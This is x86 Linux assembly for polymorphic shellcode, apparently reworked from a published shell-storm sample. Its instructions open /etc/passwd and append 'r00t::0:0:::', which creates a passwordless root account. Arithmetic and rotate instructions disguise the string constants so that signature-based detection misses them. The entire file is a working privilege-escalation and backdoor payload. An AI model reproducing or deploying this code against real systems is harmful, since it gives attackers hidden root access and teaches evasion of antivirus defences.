;Original shellcode by Kris Katterjohn at http://shell-storm.org/shellcode/files/shellcode-211.php
;All credit goes to him, this is just a polymorphic version
section .text

      global _start

_start:
; open("/etc//passwd", O_WRONLY | O_APPEND)
	
      push byte 5
      pop eax
      xor ecx, ecx
      push ecx

      ;push 0x64777373
      mov ebx, 0x65886251
      sub ebx, 0x110eede
      push ebx

      ;push 0x61702f2f
      sub ebx, 0x3074444
      push ebx

      ;push 0x6374652f
      add ebx, 0x2043611
      xor bl, 0x6f
      push ebx
      
      mov ebx, esp
      mov cx, 02001Q
      int 0x80

      xchg ebx, eax ;we can use xchg operation since we will overwrite eax in the next instruction block

; write(ebx, "r00t::0:0:::", 12)

      push byte 4
      pop eax
      xor edx, edx
      push edx

      ;push 0x3a3a3a30
      mov ecx, 0x48495051
      sub ecx, 0xe0f1621
      push ecx

      ;push 0x3a303a3a
      ror ecx, 0x10
      push ecx
 
      ;push 0x74303072
      add ecx, 0x39fff638
      push ecx   

      mov ecx, esp
      push byte 12
      pop edx
      int 0x80

; close(ebx)

      push byte 6
      pop eax
      int 0x80

; exit()

      push byte 1
      pop eax
      int 0x80
